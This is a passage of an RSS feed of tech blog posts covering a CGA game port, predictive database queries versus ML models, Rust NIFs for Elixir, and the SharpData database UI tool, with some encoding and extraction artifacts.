palettes. In the CGA scheme, four base color palettes are available and each has a
different arrangement of sixteen possible colors.

</p><p>As an extra tweak, the first color in the palette (typically the background color), can be
freely chosen out of the sixteen, giving slightly more flexibility. This means that there
are sixteen variations of each of the four base palettes, giving sixty four palettes in total.

<a id="picker_link"></a>

</p><p>To play with the color combinations, <span>click</span> on the colored areas in the first panel below.
You can pick a palette and background color, and the effect will be shown in the second panel,
using one of the screenshots. Use prev and next to cycle to a different screenshot.

</p>


<p>In the old system, the framebuffer and the palette settings are bits of memory
that live on the graphics card and are twiddled by the game directly. In the
new system, these reside in host memory, and must be converted into a modern texture format
on the fly every frame for the GPU to use.

</p><p>Given that there are only 64 possible palettes, a neat trick can be used to
simplify and speed up the framebuffer conversion. Before the game starts
running, every possible combination of palette, background color and input
framebuffer byte (4 pixels at 2bpp) are iterated through, and the resulting 8
output bytes (4 pixels at 16bpp) are stored in a 16 * 4 * 256 entry lookup
table. Converting the framebuffer each frame is then just a matter of iterating
through each byte and performing a simple lookup and memcpy to stamp out four
pixels at a time.

</p><h2>To be continued...</h2>

<p>As mentioned earlier, the sound code was one of the hardest parts of the port. Part two
explains why that was so, and the solution I used to solve it.</p>

<p>The canvas below shows a little preview.</p>












</article></div>]]>
            </description>
            <link>https://blog.loadzero.com/blog/chopper258/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23830881</guid>
            <pubDate>Tue, 14 Jul 2020 12:07:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Could predictive database queries replace machine learning models?]]>
            </title>
            <description>
<![CDATA[
Score 85 | Comments 42 (<a href="https://news.ycombinator.com/item?id=23830474">thread link</a>) | @tlarkworthy
<br/>
July 14, 2020 | https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models | <a href="https://web.archive.org/web/*/https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>This post appeared first on <a href="https://towardsdatascience.com/predictive-queries-vs-supervised-ml-models-ee7f17e4840e">Towards Data Science</a> in July 12th, 2020.</p></blockquote><p>One of the greatest trends in today’s technology landscape is the <a href="http://knowledge.wharton.upenn.edu/article/democratization-ai-means-tech-innovation/">democratization of machine learning</a>. Because the commodity state-of-the-art models, better tooling and better access to hardware: machine learning is becoming an everyday tool in the companies’ toolbox.</p><p>The ML democratization is still an on-going trend and given the disruption in this space it’s worth asking: where will this transformation take us? What the future of the everyday ML will look like?</p><p>Predictive queries are an interesting take on machine learning, especially in the ML democratization context. Solutions like <a href="http://probcomp.csail.mit.edu/">MIT’s</a> <a href="https://github.com/probcomp/bayeslite">BayesDB/BayesLite</a> and Aito provide a way to get arbitrary predictions instantly with SQL-like queries. As an example, here’s a predictive query in Aito:</p><div data-language="json"><pre><code><span>{</span>
  <span>"from"</span><span>:</span> <span>"invoice_data"</span><span>,</span>
  <span>"where"</span><span>:</span> <span>{</span>
    <span>"Item_Description"</span><span>:</span> <span>"Packaging design"</span><span>,</span>
    <span>"Vendor_Code"</span><span>:</span> <span>"VENDOR-1676"</span>
  <span>}</span><span>,</span>
  <span>"predict"</span><span>:</span> <span>"Product_Category"</span>
<span>}</span></code></pre></div><p>As such: the predictive queries seem like an easier, faster and radically different way to do machine learning. They give a glimpse of a future, where anyone can do machine learning as easily as one does database queries.</p><p>This article gives a brief introduction to the predictive queries, and it compares the predictive queries to supervised learning through 3 different aspects that are:</p><ol><li>The workflow, comparing the easiness and the costs between predictive queries and supervised machine learning</li><li>The architecture, comparing the high level differences between using predictive queries and using supervised models</li><li>And the qualitative properties (scaling, accuracy) as the quality is an obvious concern for an emerging, if promising, technology.</li></ol><h2>Introduction to the predictive queries</h2><p>Predictive queries resemble normal database queries with the exception that they provide predictions about the unknown, while the traditional database queries provide facts about the known. Here’s an example of the BQL (Bayesian Query Language) query done against BayesDB/BayesLite database:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-queries-in-bayeslite.png" alt=""></p></div><p><span>Predictive BayesQL queries in BayesLite. BayesQL is based on SQL and it provides a very elegant way to query arbitrary estimates. This query can be executed after the CREATE POPULATION, CREATE ANALYSIS, INITIALIZE ANALYSIS and ANALYZE operations. </span></p></div><p>In essence, the predictive queries can provide a very SQL-like alternative to the supervised ML models with the key differences that:</p><ol><li><p>While supervised machine learning models need to be configured, trained and deployed before usage, the predictive queries provide instant answers after the database is prepared with data. As such: the predictive queries have a different workflow.</p></li><li><p>While supervised machine learning is always specialized for a single prediction from A to B, predictive queries can be used a) to instantly predict any unknown X based on any known Y and b) to provide also recommendations, smart search and pattern mining. As such, the supervised models are narrow, while the predictive queries are multipurpose, which has implications on the architecture.</p></li><li><p>While with the supervised machine learning the narrow models are explicitly formed train time, the predictive queries do multi-purpose modeling write time or narrow modeling during query time. As such: the predictive queries are technically more challenging.</p></li></ol><p>Only few solutions exist, that provide such predictive queries. One is the mentioned BayesDB/BayesLite, which creates an in-memory multi-purpose models in a special preparation phase. Another solution is Aito.ai, which does query-time narrow modeling without explicit preparations. Here’s is an example of the Aito workflow:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-queries-in-3-steps.png" alt=""></p></div><p><span>Predictive BayesQL queries in BayesLite. BayesQL is based on SQL and it provides a very elegant way to query arbitrary estimates. This query can be executed after the CREATE POPULATION, CREATE ANALYSIS, INITIALIZE ANALYSIS and ANALYZE operations. </span></p></div><p>We are focusing the following comparisons on Aito. We feel this focus is justified as in Aito we are more familiar with the solution, and it is mature enough to serve the end customers in live production settings. While BayesLite is extremely impressive and their BQL interface and DB/ML integration are worth envy: BayesLite seems to have properties like the 16 minute preparation phase for simple data, which are not consistent with the presented arguments.</p><p>So let’s next dig deeper on the difference in workflow, architecture and quality between the predictive queries and supervised ML models.</p><h2>1. The Workflow</h2><p>The first difference between predictive queries and the traditional supervised models relates to the workflow and the costs.</p><p>Supervised ML models are deployed typically in data science projects, which have several steps like the handover to the data scientist, data preparation, feature engineering, model fitting, deployment, integrations, retraining and monitoring &amp; maintenance. As an addition to this linear progression, you also often have an iteration phase, where the results are improved by refining the data, the preparations, the features, the models, the deployment or the integrations.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-data-science-project-workflow.png" alt=""></p></div><p><span>A simplified version of the data science project.</span></p></div><p>Taking a supervised model to production may take several weeks or months from one to two persons. This can raise the price point up to hundred thousand euros per model. If you need several models, you need several data science projects, leading to multiplied expenses and delays.</p><p>Now this process changes rather dramatically, if you implement the machine learning functionality with predictive queries. With predictive queries the workflow is in essence the following:</p><ol><li>Prepare the auxiliary <a href="https://aito.ai/blog/introducing-a-new-database-category-the-predictive-database/">predictive database</a> once (if it’s not used as the main database)</li><li>Verify good enough prediction quality with evaluate requests</li><li>Integrate the predictive queries like you would integrate SQL queries</li><li>Write the test/evaluation cases, push these to Git and let the CI handle the regression testing</li><li>If seen as necessary: track the in-production prediction quality with analytics and display the metrics in the product dashboard.</li></ol><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-query-workflow.png" alt=""></p></div><p><span>The workflow with the predictive queries is similar to the workflow with the database queries. Still, because predictive functionality is statistical and its behavior may drift as the data changes: it is advisable to verify the prediction quality (step 2) before implementation and monitor the prediction quality in production (step 5).</span></p></div><p>While putting an auxiliary database (like ElasticSearch) into production can take weeks, the expense related to putting each query into production is closer to the expense of using search/database queries. Often such queries form only a small part of the related functionality’s expense, and often the query based functionality can be implemented in hours and put into production in days.</p><p>This dramatic difference between the workflows and the expenses are explained a) partly by the <a href="https://aito.ai/blog/introducing-a-new-database-category-the-predictive-database/">predictive database</a>’s AutoML capabilities that are accelerated by a specialized database and b) partly by the reduced need for deployments and integrations as the data and the ML are already integrated into a single system. The complex phases of the data science project get systematically eliminated or simplified:</p><ol><li>The handover of the data science project to the data scientist is not needed as the predictive query workflow is easy enough for the software developers.</li><li>Data preparation and feature engineering steps can be greatly eliminated with the ML-database integration. You don’t need to re-prepare and re-upload the data, if the data is already in the database. You don’t need to manually aggregate data into flat data frames, if you can do <a href="https://aito.ai/docs/articles/utilizing-relationships-in-aito/">inference through the database references</a>. You don’t need to manually featurize text either, as the predictive database analyzes the <a href="https://aito.ai/docs/api/#schema-analyzer">text automatically</a> just like ElasticSearch. Last: you don’t need to manage feature redundancies, if the database has built-in <a href="https://aito.ai/blog/introducing-concept-learning-to-free-you-from-feature-engineering/">feature learning capabilities</a>.</li><li>Modeling phase can be automated with a single sophisticated model that provides good enough results for most applications.</li><li>Per model cloud deployment, live integrations and retraining of models simply disappear, because you don’t need to ‘deploy’ or retrain the predictive queries. Instead you integrate one auxiliary predictive database like you would integrate <a href="https://www.elastic.co/">ElasticSearch</a>. If you use the predictive database as your main database, you can omit even that one integration.</li><li>Maintenance is easier, because instead of maintaining deployed infrastructure for each prediction target, you maintain the SQL-like queries like you would maintain code with Git &amp; CI.</li></ol><p>As a consequence, the workflow and the cost of implementing ML via predictive queries is similar to the process of implementing normal business logic via SQL.</p><p>The second difference between the predictive queries and the supervised models is the narrowness and it’s implications on the software architecture.</p><p>Famously: the supervised ML models are <em>narrow</em> in 2 different respects:</p><p>1.Narrowness of the prediction setting. Supervised learning models are essentially narrow functions from A (e.g. text) to B (category), which means that if you have 10 different problems, you end up with with 10 different supervised ML models.
2. Narrowness of the predictive functionality type. A single kind of supervised method can typically serve only one kind of predictions. For this reason you often need completely separate systems or products to implement predictions, recommendations, smart search and pattern mining.d up with with 10 different supervised ML models.</p><p>This combined narrowness has negative implications on the architecture. If you have 10 different predictive functionalities that mix prediction, recommendation and smart search use cases: you end up struggling with a very complex system. The system may include separate supervised model platform with half dozen deployed models, separate recommendation system, a separate smart searching product and separate pattern mining tools. Such complexity is hard to learn, master and …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models">https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models</a></em></p>]]>
            </description>
            <link>https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models</link>
            <guid isPermaLink="false">hacker-news-small-sites-23830474</guid>
            <pubDate>Tue, 14 Jul 2020 11:01:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing Rust NIFs for Elixir with Rustler]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23829651">thread link</a>) | @marcoow
<br/>
July 14, 2020 | https://simplabs.com/blog/2020/06/25/writing-rust-nifs-for-elixir-with-rustler/ | <a href="https://web.archive.org/web/*/https://simplabs.com/blog/2020/06/25/writing-rust-nifs-for-elixir-with-rustler/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

<p>Rustler is a fantastic project built to make writing Rust NIFs a simple process;
and the upcoming v0.22 release will provide a much cleaner syntax to do so. The
library handles encoding and decoding Rust values into Erlang terms, catches
Rust panics before they unwind to C and <em>should</em> make it impossible to crash the
BEAM from a Rust NIF.</p>
<h2 id="getting-started-with-rustler">Getting started with Rustler</h2>
<p>One of my first forays into Rust-implemented NIFs was while building a
micro-library providing Base64 encoding and decoding, creatively named
<a href="https://github.com/niklaslong/base64" target="_blank" rel="noopener">base64</a>. It's utterly pointless as that
functionality comes built-in to Elixir but I wanted to start with something
simple. On the plus side, this meant I could easily compare the performance of
the NIF version to the Elixir implementation which can be found in the
<a href="https://hexdocs.pm/elixir/Base.html" target="_blank" rel="noopener"><code>Base</code> module</a>.</p>
<p>The library consists of two functions: <code>encode/2</code> and <code>decode/2</code> and it's using
<a href="https://github.com/marshallpierce/rust-base64" target="_blank" rel="noopener">rust-base64</a> to do the heavy
lifting in the NIFs. Let's walk through how this all works.</p>
<p>To get started, we need a new mix project with rustler installed as a
dependency.</p>
<pre><code>mix new base64

mix deps.get
mix rustler.new
</code></pre><p>Let's explore the project's resulting structure (I've left out the usual Elixir
files and directories and focused on <code>lib</code> and <code>native</code>):</p>
<pre><code>.
â”œâ”€â”€ lib
â”‚   â””â”€â”€ base64.ex
â””â”€â”€ native
    â””â”€â”€ base64_nif
        â”œâ”€â”€ Cargo.lock
        â”œâ”€â”€ Cargo.toml
        â”œâ”€â”€ README.md
        â””â”€â”€ src
            â””â”€â”€ lib.rs</code></pre><ul>
<li><code>lib</code> will contain Elixir code (like any standard mix project).</li>
<li><code>base64.ex</code> will contain the stubs to our NIFs. This is the Elixir module the
NIF module will be registered to.</li>
<li><code>native</code> will be home to the Rust code. In fact, a cargo package has been
created within this directory (in this case named <code>base64_nif</code>).</li>
<li><code>lib.rs</code> will contain the NIFs.</li>
</ul>
<p>The Rust NIFs are compiled and linked into a shared library loaded by Erlang
code at runtime. Elixir (or Erlang) implementations of the functions are also
necessary. These are usually minimal stubs defining the name and arity of the
NIFs and serve as fallback implementations if the NIFs aren't loaded. Let's
start with the Elixir stubs.</p>
<pre><code>

<span><span>defmodule</span> <span>Base64</span></span> <span>do</span>
  <span>use</span> Rustler, <span>otp_app:</span> <span>:base64</span>, <span>crate:</span> <span>"base64_nif"</span>

  <span>@spec</span> decode(binary, atom) :: binary
  <span><span>def</span> <span>decode</span></span>(_b64, _opt \\ <span>:standard</span>), <span>do:</span> error()

  <span>@spec</span> encode(binary, atom) :: binary
  <span><span>def</span> <span>encode</span></span>(_s, _opt \\ <span>:standard</span>), <span>do:</span> error()

  <span><span>defp</span> <span>error</span></span>(), <span>do:</span> <span>:erlang</span>.nif_error(<span>:nif_not_loaded</span>)
<span>end</span></code></pre><p>The first line is configuration and lets Rustler know what Rust crate to compile
for the Elixir module.</p>
<p>As mentioned above, <code>decode/2</code> and <code>encode/2</code> don't actually implement any
decoding or encoding; they simply call <code>error/0</code> if the NIFs can't be found.
However, the names and the arguments must match in both the Rust and Elixir
implementations. Both functions take in a <code>binary</code> to be encoded or decoded and
an <code>atom</code> for configuration as different character sets that can be used
(url-safe, without padding, etc...). The default is fittingly set to
<code>:standard</code>. The Rust NIFs are implemented as follows.</p>
<pre><code>

<span>use</span> base64;
<span>use</span> rustler::Atom;

<span>mod</span> atoms {
    rustler::atoms! {
      crypt,
      imap_map7,
      standard,
      standard_no_pad,
      url_safe,
      url_safe_no_pad,
    }
}

<span>#[rustler::nif]</span>
<span>pub</span> <span><span>fn</span> <span>decode</span></span>(b64: <span>String</span>, opt: Atom) -&gt; <span>String</span> {
    <span>let</span> config: base64::Config = match_config(opt);
    <span>let</span> bytes = base64::decode_config(b64, config).expect(<span>"decode failed: invalid b64"</span>);

    <span>String</span>::from_utf8(bytes).unwrap()
}

<span>#[rustler::nif]</span>
<span>pub</span> <span><span>fn</span> <span>encode</span></span>(s: <span>String</span>, opt: Atom) -&gt; <span>String</span> {
    <span>let</span> config: base64::Config = match_config(opt);
    base64::encode_config(s.as_bytes(), config)
}

<span><span>fn</span> <span>match_config</span></span>(option: Atom) -&gt; base64::Config {
    
}

rustler::init!(<span>"Elixir.Base64"</span>, [decode, encode]);</code></pre><p>The last line is interesting: <code>rustler::init</code> is a procedural macro that allows
the use of <code>#[rustler::nif]</code> to annotate functions to be wrapped as NIFs. It
takes in the name of the Elixir module in which the stubs are defined (in this
case <code>"Elixir.Base64"</code>) and an array containing the names of the functions
annotated as NIFs (in this case <code>[decode, encode]</code>). In short, this links
everything together.</p>
<p>The use statements at the top of the file are importing the
<a href="https://github.com/marshallpierce/rust-base64" target="_blank" rel="noopener">rust-base64 crate</a> (<code>base64</code>)
mentioned earlier, which we'll use for encoding and decoding, and the
<code>rustler::Atom</code> type which allows us to represent an Elixir/Erlang <code>atom</code> in
Rust. Both the <code>rustler</code> and <code>base64</code> crates have been added to the <code>Cargo.toml</code>
dependencies.</p>
<p>The <code>rustler::atoms</code> macro defines Rust functions that return Erlang atoms; in
this case, the possible options for the <code>encode/2</code> and <code>decode/2</code> functions.</p>
<p>Finally, we come to the NIF definitions. The functions take in a <code>String</code> and a
<code>rustler::Atom</code>, and return a <code>String</code>. This is consistent with the Elixir
stubs, as are the names. In this case, the conversions between Rust values and
Elixir terms are conveniently handled by Rustler. However, for more complex
types, this may need to be implemented manually.</p>
<h2 id="how-does-it-compare-to-the-elixir-implementation">How does it compare to the Elixir implementation?</h2>
<p>Rust is fast. Really fast. This was my set-up (using
<a href="https://github.com/bencheeorg/benchee" target="_blank" rel="noopener">benchee</a>):</p>
<pre><code>Operating System: macOS
CPU Information: Intel(R) Core(TM) i5-4258U CPU @ 2.40GHz
Number of Available Cores: 4
Available memory: 16 GB
Elixir 1.10.2
Erlang 22.3.2</code></pre><p>I used <em>hello world</em> as the short string and Sarah Kayâ€™s poem
<em><a href="https://www.youtube.com/watch?v=0snNB1yS3IE" target="_blank" rel="noopener">B (If I Should Have a Daughter)</a></em>
as the longer string.</p>
<p>Decoding:</p>
<pre><code>##### With input Bigger #####
Comparison:                    ips
Rust Nif decode           175.74 K
Elixir/Erlang decode        4.35 K - 40.37x slower +224.03 Î¼s

##### With input Small #####
Comparison:                    ips
Rust Nif decode           953.17 K
Elixir/Erlang decode      555.63 K - 1.72x slower +0.75 Î¼s</code></pre><p>Encoding:</p>
<pre><code>##### With input Bigger #####
Comparison:                    ips
Rust Nif encode           203.14 K
Elixir/Erlang encode        6.95 K - 29.23x slower +138.98 Î¼s

##### With input Small #####
Comparison:                    ips
Rust Nif encode           941.14 K
Elixir/Erlang encode      615.62 K - 1.53x slower +0.56 Î¼s</code></pre><p>As the data to encode or decode becomes larger, the overhead of creating the
NIFs becomes smaller and the gains in speed are impressive. These results were
obtained with fairly small data and so the potential performance gains possible
by leveraging Rust NIFs when dealing with CPU-intensive tasks are exciting.</p>
<p>I left out the memory usage comparisons but the Elixir/Erlang implementations
used 3-5x more memory than the NIFs.</p>
<h2 id="tldr-rustler-makes-it-easy-to-implement-nifs">TL;DR: Rustler makes it easy to implement NIFs</h2>
<p>Other than the <code>#[rustler::nif]</code> function annotations and the <code>rustler::init</code>
call, nothing more is required to implement Rust NIFs with Rustler. The
boilerplate and the complexities of translating Rust values to Erlang terms
being handled by the library, there's little resistance to leveraging the power
of Rust in Elixir/Erlang.</p>

  </div></div>]]>
            </description>
            <link>https://simplabs.com/blog/2020/06/25/writing-rust-nifs-for-elixir-with-rustler/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23829651</guid>
            <pubDate>Tue, 14 Jul 2020 08:16:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Instant Customizable RDBMS Vue UI in 20kb Gist Desktop App]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23829512">thread link</a>) | @mythz
<br/>
July 14, 2020 | https://sharpscript.net/sharp-apps/sharpdata | <a href="https://web.archive.org/web/*/https://sharpscript.net/sharp-apps/sharpdata">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/NetCoreApps/SharpData">SharpData</a> is a generic app for providing an instant UI around multiple RDBMS's:</p>
<blockquote>
<p>YouTube: <a href="https://youtu.be/GjVipOqwZMA" rel="nofollow">youtu.be/GjVipOqwZMA</a></p>
</blockquote>
<p><a href="https://youtu.be/GjVipOqwZMA" rel="nofollow"><img src="https://raw.githubusercontent.com/ServiceStack/docs/master/docs/images/release-notes/v5.9/sharpdata-custom-appsettings.png" alt=""></a></p>
<p>It makes use of the <a href="https://docs.servicestack.net/netcore-windows-desktop" rel="nofollow">app</a> dotnet tool for running Chromium
<a href="https://sharpscript.net/sharp-apps/gist-desktop-apps" rel="nofollow">Gist Desktop Apps</a> on-the-fly without installation, from a single URL that can also
<a href="https://docs.servicestack.net/mix-tool" rel="nofollow">mix in additional gists</a> which can be used in SharpData to configure RDBMS's, copy SQLite databases and
apply per-database customizations to add navigable deep links and customized UI Views to each table resultset.</p>
<p>Whilst SharpData supports <a href="https://github.com/ServiceStack/ServiceStack.OrmLite#8-flavours-of-ormlite-is-on-nuget">connecting to most popular RDBMS's</a>, it's
especially useful for being able to deploy an instant stand-alone UI with an embedded SQLite databases which can be published independently in a gist and
launched from a single URL.</p>
<p>For an example of this in action we've published customized gists for the
<a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/linq/downloading-sample-databases" rel="nofollow">Northwind</a> and
<a href="https://www.sqlitetutorial.net/sqlite-sample-database/" rel="nofollow">Chinook</a> SQLite databases which after installing the latest
<a href="https://docs.servicestack.net/netcore-windows-desktop" rel="nofollow">app</a> dotnet tool:</p>
<pre><code>$ dotnet tool install -g app
$ app -version
</code></pre>
<p>First time <code>app</code> is run it registers the <a href="#app-url-schemes">app:// URL scheme</a> allowing Windows x64 Desktop Apps to be launched from URLs:</p>
<ul>
    <li><strong><a name="app://sharpdata?mix=northwind.sharpdata">app://sharpdata?mix=northwind.sharpdata</a></strong></li>
    <li><strong><a name="app://sharpdata?mix=chinook.sharpdata">app://sharpdata?mix=chinook.sharpdata</a></strong></li>
</ul>
<p>Or via command-line:</p>
<pre><code>$ app open sharpdata mix northwind.sharpdata
$ app open sharpdata mix chinook.sharpdata
</code></pre>
<p>Cross platform using the <a href="https://docs.servicestack.net/dotnet-tool" rel="nofollow">x dotnet tool</a> (in Default Browser):</p>
<pre><code>$ x open sharpdata mix northwind.sharpdata
$ x open sharpdata mix chinook.sharpdata
</code></pre>
<p>Each of these options will download &amp; run the latest version of <a href="https://github.com/NetCoreApps/SharpData">SharpData</a> along with a
copy of the <a href="https://gist.github.com/gistlyn/0ce0d5b828303f1cb4637450b563adbd">northwind.sharpdata</a> or
<a href="https://gist.github.com/gistlyn/96b10369daf94897531810841cb097f2">chinook.sharpdata</a> gists on-the-fly containing the embedded SQLite DB along with any
UI customizations.</p>
<h4>
Hosted as a .NET Core App</h4>
<p>As <a href="https://github.com/NetCoreApps/SharpData">NetCoreApps/SharpData</a> is also a standard .NET Core project, it can also be deployed as a
normal stand-alone .NET Core Web App:</p>
<h3>
<a href="https://sharpdata.netcore.io/" rel="nofollow">https://sharpdata.netcore.io</a>
</h3>
<h3>
Tiny footprint</h3>
<p>An impressively capable .NET Core App that fits into a tiny <strong>20kb .zip</strong> footprint thanks to <a href="https://sharpscript.net/gist-desktop-apps">Gist Desktop App's Architecture</a>. It's small dynamic <code>#Script</code> &amp; Vue TypeScript code-base also makes it highly customizable to tailor &amp; further extend with
App-specific requirements - suitable for offering advanced system users a quick, capable customized read-only UI of your DBs.</p>
<p><strong>SharpData</strong> started as a demonstration showing how productive <a href="https://sharpscript.net/" rel="nofollow">#Script</a> can be in the number of areas where
dynamic languages offer far superior productivity then the typical .NET approach of using C# to type an entire code-base &amp; models.</p>
<p>For example a single <code>#Script</code> page provides a lot of the functionality in <a href="https://docs.servicestack.net/autoquery-rdbms" rel="nofollow">AutoQuery</a> where it provides an instant HTTP API
(in all registered ServiceStack formats) around all registered RDBMS tables, in all OrmLite supported RBDMS's, that includes support for custom fields,
multiple querying options, paging, multi OrderBy's in a parameterized SQL query executed with OrmLite's SQL async DB APIs:</p>
<h2>
AutoQuery Script</h2>
<h3>
<a href="https://github.com/NetCoreApps/SharpData/blob/master/wwwroot/db/_db/_table/index.html">/db/_db/_table/index.html</a>
</h3>
<pre><code>{{ {namedConnection:db} |&gt; if (db &amp;&amp; db != 'main') |&gt; useDb }}

```code|quiet
var ignore = ['db','fields','format','skip','take','orderBy']
var fields = qs.fields ? qs.fields.split(',').map(x =&gt; sqlQuote(x)).join(',') : '*'
var sql = `SELECT ${fields} FROM ${sqlQuote(table)}`
var filters = []
var queryMap = qs.toObjectDictionary().withoutKeys(ignore)
#each queryMap.Keys.toList()
    var search = queryMap[it.sqlVerifyFragment()].sqlVerifyFragment();
    #if search == '=null' || search == '!=null'
        `${sqlQuote(it)} ${search=='=null' ? 'IS' : 'IS NOT'} NULL` |&gt; addTo =&gt; filters
        queryMap[it] = null
    else if search.startsWith('=')
        `${sqlQuote(it)} = @${it}` |&gt; addTo =&gt; filters
        queryMap[it] = search.substring(1).coerce()
    else if search.startsWith('&lt;=') || search.startsWith('&gt;=') || search.startsWith('!=')
        `${sqlQuote(it)} ${search.substring(0,2)} @${it}` |&gt; addTo =&gt; filters
        queryMap[it] = search.substring(2).coerce()
    else if search.startsWith('&lt;') || search.startsWith('&gt;')
        `${sqlQuote(it)} ${search.substring(0,1)} @${it}` |&gt; addTo =&gt; filters
        queryMap[it] = search.substring(1).coerce()
    else if search.endsWith(',')
        `${sqlQuote(it)} IN (${search.trimEnd(',').split(',').map(i=&gt;i.toLong()).join(',')})` |&gt;addTo=&gt;filters
        queryMap[it] = null
    else if search.startsWith('%') || search.endsWith('%')
        `${sqlQuote(it).sqlCast('varchar')} LIKE @${it}` |&gt; addTo =&gt; filters
    else
        `${sqlQuote(it).sqlCast('varchar')} = @${it}` |&gt; addTo =&gt; filters
    /if
/each
#if !filters.isEmpty()
    sql = `${sql} WHERE ${filters.join(' AND ')}`
/if
#if qs.orderBy
    sql = `${sql} ORDER BY ${sqlOrderByFields(qs.orderBy)}`
/if
#if qs.skip || qs.take
    sql = `${sql} ${sqlLimit(qs.skip,qs.take)}`
/if
sql |&gt; dbSelect(queryMap) |&gt; return
```
{{ ifError |&gt; show(sql) }}
{{htmlError}}
</code></pre>
<p>The <code>_</code> prefixes in the path utilizes <a href="https://sharpscript.net/docs/sharp-pages#page-based-routing" rel="nofollow">Page Based Routing</a> allowing for
<a href="https://en.wikipedia.org/wiki/Convention_over_configuration" rel="nofollow">CoC</a> based
<a href="https://en.wikipedia.org/wiki/Clean_URL" rel="nofollow">Clean URL</a> routes without needing to define &amp; maintain separate routes where the
same script supports querying all <a href="https://docs.servicestack.net/multitenancy#changedb-apphost-registration" rel="nofollow">registered multitenancy databases</a>.</p>
<h3>
Instant Customizable RDBMS UI</h3>
<p>The <a href="https://github.com/NetCoreApps/SharpData">SharpData</a> project essentially provides a UI around this script, surfacing its features &amp; give
it instant utility which ended up being so useful that it's become the quickest way to perform fast adhoc DB queries as it's easy to configure
which RDBMS's &amp; tables to show in a simple text file, easy to customize its UI, enables 1-click export into Excel and its shortcut syntax
support in column filters is a fast way to perform quick adhoc queries.</p>
<h3>
Quick Tour</h3>
<p>We'll quickly go through some of its features to give you an idea of its capabilities, from the above screenshot we can some of its
filtering capabilities. All results displayed in the UI are queried using the above
<a href="https://github.com/NetCoreApps/SharpData/blob/master/wwwroot/db/_db/_table/index.html">sharpdata</a> <code>#Script</code> HTTP API
which supports the following features:</p>
<h3>
Filters</h3>
<p>All query string parameter except for <code>db,fields,format,skip,take,orderBy</code> are treated as filters, where you can:</p>
<ul>
<li>Use <code>=null</code> or <code>!=null</code> to search <code>NULL</code> columns</li>
<li>Use <code>&lt;=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&gt;=</code>, <code>&lt;&gt;</code>, <code>!=</code> prefix to search with that operator</li>
<li>Use <code>,</code> trailing comma to perform an <code>IN (values)</code> search (integer columns only)</li>
<li>Use <code>%</code> suffix or prefix to perform a <code>LIKE</code> search</li>
<li>Use <code>=</code> prefix to perform a coerced "JS" search, for exact <code>number</code>, <code>boolean</code>, <code>null</code> and WCF date comparisons</li>
<li>Otherwise by default performs a "string equality" search where columns are casted and compared as strings</li>
</ul>
<p>Here's the filtered list used in the above screenshot:</p>
<p><a href="http://sharpdata.netcore.io/db/northwind/Order?format=json&amp;Id=%3E10200&amp;CustomerId=V%25&amp;Freight=%3C%3D30&amp;OrderDate=%3E1997-01-01&amp;take=100" rel="nofollow">/db/northwind/Order?Id=&gt;10200&amp;CustomerId=V%&amp;Freight=&lt;=30&amp;OrderDate=&gt;1997-01-01</a></p>
<h3>
Custom Field Selection</h3>
<p>The <strong>column selection</strong> icon on the top left of the results lets you query custom select columns which is specified using <code>?fields</code>:</p>
<ul>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=json&amp;fields=Id%2CCompanyName%2CContactName%2CContactTitle&amp;take=100" rel="nofollow">/db/northwind/Customer?fields=Id,CompanyName,ContactName,ContactTitle</a></li>
</ul>
<h3>
Multiple OrderBy's</h3>
<p>You can use <a href="https://docs.servicestack.net/autoquery-rdbms#multiple-orderbys" rel="nofollow">AutoQuery Syntax</a> to specify multiple Order By's:</p>
<ul>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=json&amp;orderBy=-Id,CompanyName,-ContactName" rel="nofollow">/db/northwind/Customer?orderBy=-Id,CompanyName,-ContactName</a></li>
</ul>
<h3>
Paging</h3>
<p>Use <code>?skip</code> and <code>?take</code> to page through a result set</p>
<h3>
Format</h3>
<p>Use <code>?format</code> to specify which <strong>Content-Type</strong> to return the results in, e.g:</p>
<ul>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=html" rel="nofollow">/db/northwind/Customer?format=html</a></li>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=json" rel="nofollow">/db/northwind/Customer?format=json</a></li>
<li><a href="https://sharpdata.netcore.io/db/northwind/Customer?format=csv" rel="nofollow">/db/northwind/Customer?format=csv</a></li>
</ul>
<h3>
Multitenancy</h3>
<p>You can specify which registered DB to search using the path info, use <code>main</code> to query the default database:</p>
<pre><code>/db/&lt;named-db&gt;/&lt;table&gt;
</code></pre>
<h3>
Open in Excel</h3>
<p>SharpData detects if <strong>Excel</strong> is installed and lets you open the un-paged filtered resultset directly by clicking the <strong>Excel</strong> button</p>
